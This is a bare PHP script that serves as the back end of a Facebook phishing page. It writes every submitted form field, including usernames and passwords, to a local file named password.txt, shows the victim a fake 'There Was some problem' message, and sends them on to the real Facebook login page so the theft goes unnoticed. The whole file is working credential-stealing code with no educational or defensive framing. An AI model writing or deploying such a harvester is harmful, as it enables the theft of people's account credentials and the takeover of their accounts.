 <?php
echo "<html><body bgcolor='#141823'>There Was some problem please try again</body>";
header("Location: http://facebook.com");
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
echo "<script>document.location='https://www.facebook.com/login.php?login_attempt=1';</script></html>";
exit;
?>